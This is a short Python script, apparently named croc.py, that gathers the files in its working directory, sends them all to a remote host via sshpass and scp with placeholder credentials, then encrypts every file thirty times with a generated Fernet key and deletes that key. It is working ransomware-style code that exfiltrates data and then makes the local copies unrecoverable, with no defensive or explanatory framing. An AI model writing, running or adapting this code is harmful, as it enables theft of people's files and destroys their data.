#!/bin/python3.9
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "croc.py" or file == "secret.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

os.system("sshpass -p [password] scp * [username]@[ip]:[path]")
print("Files transfered") 

key = Fernet.generate_key()
with open("secret.key", "wb") as thekey:
    thekey.write(key)

for i in range(30):
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
print("Files encrypted")

os.remove("secret.key")
